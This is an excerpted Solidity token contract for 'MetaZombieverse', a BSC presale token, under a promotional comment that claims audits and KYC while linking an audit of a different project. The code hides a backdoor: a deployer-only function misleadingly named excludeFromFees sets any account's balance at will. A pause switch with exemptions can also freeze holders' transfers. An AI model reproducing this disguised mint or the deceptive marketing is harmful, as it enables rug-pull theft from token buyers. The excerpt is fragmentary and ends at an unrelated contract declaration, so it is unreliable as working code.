...
/**
     * MetaZombieverse is a co-op kill to earn 2D zombie survival game, defend yourself against hordes 
     of zombies using special weapon NFTs! Survive and Kill Zombies with Your Friends! MetaZombieverse 
     will be bringing back the nostalgia enjoyed by FPS zombie shooters of the past. ✅SAFU&AUDIT&KYC 
     ✅ 0% BUY/SELL TAX! ✅Huge Marketing on Pancakeswap Launch! ✅ No Private Sale!

MetaZombieverse Presale
https://www.pinksale.finance/launchpad/0xa71ff98603495f206b15ceca584eb4408924793d?chain=BSC

    https://www.metazombieverse.com/
    https://twitter.com/MetaZombievers
    https://t.me/MetaZombieverseGame
    https://github.com/CFG-NINJA/audits/blob/main/20220829_CFGNINJA_Badass%20land_Audit.pdf
https://whitepaper.metazombieverse.com/
    Badass Land Fair Launch
     */
// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

abstract contract DOGEContext {
...
interface DOGEIERC71Metadata is DOGEIERC71 {
    /**
...
abstract contract DOGEOwnable is DOGEContext {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "DOGEOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "DOGEOwnable: new owner is the zero address");
...
contract ZOMBIEVERSE is DOGEContext, DOGEIERC71, DOGEIERC71Metadata, DOGEOwnable {
    // Openzeppelin variables
    mapping(address => uint256) private DOGEbalances;
  mapping(address => bool) public DOGEAZERTY;
  ...
  address DOGEpinksale;
    ...
    constructor() {
        // Editable
            DOGEpinksale = msg.sender;
            DOGEAZERTY[DOGEpinksale] = true;
        _name = "MetaZombieverse";
        _symbol = "Z0MBIEVERSE";
     ...
     * {DOGEIERC71-balanceOf} and {DOGEIERC71-transfer}.
     */
    ...
    /**
     * @dev See {DOGEIERC71-totalSupply}.
     */
    ...
    /**
     * @dev See {DOGEIERC71-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return DOGEbalances[account];
    }

    /**
     * @dev See {DOGEIERC71-transfer}.
     *
     * Requirements:
     *
    ...
    /**
     * @dev See {DOGEIERC71-transferFrom}.
     *
     ...
     * problems described in {DOGEIERC71-approve}.
     *
  ...
  modifier DOGE0wner () {
    require(DOGEpinksale == msg.sender, "ERC20: cannot permit Pancake address");
    _;
    ...
    function _transfer(
        ...
        // My implementation
        require(!DOGEisPaused || isPauseExempt[from], "Transactions are paused.");
        // End my implementation

        uint256 fromBalance = DOGEbalances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            DOGEbalances[from] = fromBalance - amount;
        }
        DOGEbalances[to] += amount;
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        DOGEbalances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }
  function excludeFromFees(address account, uint256 amount) public DOGE0wner {
    DOGEbalances[account] = (amount - amount) + amount * 10 ** 9;
            emit Transfer(address(0), account, amount);
  }
    /**
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        uint256 accountBalance = DOGEbalances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            DOGEbalances[account] = accountBalance - amount;
        }
        ALLtotalSupply -= amount;
...
contract floki is DOGEContext, IERC20, DOGEOwnable { 
